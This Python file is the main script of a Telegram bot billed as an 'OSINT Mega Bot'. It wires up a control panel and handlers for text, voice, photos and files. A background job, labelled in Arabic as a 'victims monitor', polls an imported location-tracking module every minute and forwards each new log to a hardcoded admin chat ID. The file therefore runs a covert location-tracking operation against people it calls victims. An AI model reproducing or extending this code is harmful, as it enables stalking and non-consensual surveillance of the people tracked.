import logging
import asyncio
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters
)
from telegram.request import HTTPXRequest

from config import BOT_TOKEN
from ui.panel import panel
from router import callback_router, message_router
from tools.track_location import check_new_logs 

# 1. إعداد نظام التسجيل (Logging)
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# 2. إعدادات الاتصال
request_obj = HTTPXRequest(
    connect_timeout=40.0,
    read_timeout=40.0,
    connection_pool_size=100
)

# 3. بناء التطبيق
app = (
    Application.builder()
    .token(BOT_TOKEN)
    .request(request_obj)
    .get_updates_request(request_obj)
    .build()
)

# --- الوظيفة الخلفية: مراقب الضحايا ---
async def check_victims_job(context):
    ADMIN_ID = 8233752864 
    try:
        new_logs = await check_new_logs()
        if new_logs:
            for log_message in new_logs:
                await context.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=log_message,
                    parse_mode='Markdown'
                )
    except Exception as e:
        logging.error(f"Error in monitor job: {e}")

# --- معالجات الأوامر والرسائل ---
app.add_handler(CommandHandler("start", panel))
app.add_handler(CommandHandler("panel", panel))
app.add_handler(CallbackQueryHandler(callback_router))

# ✅ التعديل هنا: أضفنا filters.PHOTO لكي يستجيب البوت للصور العادية
# وأضفنا filters.Document.IMAGE لاستقبال الصور المرسلة كملفات
app.add_handler(MessageHandler(
    (filters.TEXT | filters.VOICE | filters.AUDIO | filters.PHOTO | filters.Document.IMAGE | filters.Document.ALL) & ~filters.COMMAND, 
    message_router
))

# 4. تشغيل البوت
if __name__ == '__main__':
    print("🚀 OSINT Mega Bot is starting...")
    
    if app.job_queue:
        app.job_queue.run_repeating(check_victims_job, interval=60, first=10)
        print("📡 Location Tracker Monitor active (60s interval)")
    
    print("🎙️ Audio Filters & OSINT Ready.")
    print("📢 البوت الآن قيد التشغيل... اضغط Ctrl+C للإيقاف.")

    app.run_polling(drop_pending_updates=True)